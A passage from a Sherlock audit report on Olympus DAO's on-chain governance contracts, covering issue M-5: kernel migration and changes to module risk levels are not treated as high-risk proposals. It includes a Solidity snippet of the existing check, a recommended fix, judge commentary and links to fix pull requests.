By activation, you mean the triggering of the start of voting like I described above, or do you mean something else? 
The docs mention a veto guardian that will eventually be set to the zero address. If there is a new admin for this case, it won't be able to do the same sort of relinquishment without having the end result of the attack being a locked treasury (assuming there's no governance bypass to access funds some other way). If that's acceptable, I believe your two changes will solve the issue.

**0xLienid**

Yep, triggering of the start of voting.

**0xrusowsky**

- https://github.com/OlympusDAO/bophades/pull/303

@IllIllI000 ready for review

# Issue M-5: High-risk actions aren't all covered by the existing checks 

Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/104 

## Found by 
IllIllI, LTDingZhen, cawfree, ck
## Summary

Things such as changing the list of high risk operations, or migrating kernels are not counted as high risk, even though they are high-risk


## Vulnerability Detail

High risk modules are checked against a mapping, but the changing of values within the mapping is not marked as high risk.

In addition, the `MigrateKernel` action is not protected, even though it can [brick the protocol](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/Kernel.sol#L338)


## Impact

Allows an attacker to brick the protocol with a low threshold, or to remove the high-risk modules from the list of high risk modules, resulting in a lower threshold
Violates invariant of high-risk actions needing to be behind a higher quorum


## Code Snippet

`MigrateKernel` isn't considered high-risk, and neither are calls to [`_setModuleRiskLevel()`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L593-L602):
```solidity
// File: src/external/governance/GovernorBravoDelegate.sol : GovernorBravoDelegate._isHighRiskProposal()   #1

647 @>                     // If the action is upgrading a module (1)
648                        if (action == 1) {
649                            // Check if the module has a high risk keycode
650                            if (isKeycodeHighRisk[Module(actionTarget).KEYCODE()]) return true;
651                        }
652 @>                     // If the action is installing (2) or deactivating (3) a policy, pull the list of dependencies
653                        else if (action == 2 || action == 3) {
654                            // Call `configureDependencies` on the policy
655                            Keycode[] memory dependencies = Policy(actionTarget)
656                                .configureDependencies();
657    
658                            // Iterate over dependencies and looks for high risk keycodes
659                            uint256 numDeps = dependencies.length;
660                            for (uint256 j; j < numDeps; j++) {
661                                Keycode dep = dependencies[j];
662                                if (isKeycodeHighRisk[dep]) return true;
663                            }
664:                       }
```
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L647-L664


## Tool used

Manual Review


## Recommendation

Add those operations to the high risk category




## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**haxatron** commented:
> Medium. Bypass of a non-critical security feature for MigrateKernel(). I would say setModuleRiskLevel() part doesn't count because it requires 2 proposals to succeed. Nice catch!



**0xLienid**

Fix: https://github.com/OlympusDAO/bophades/pull/298

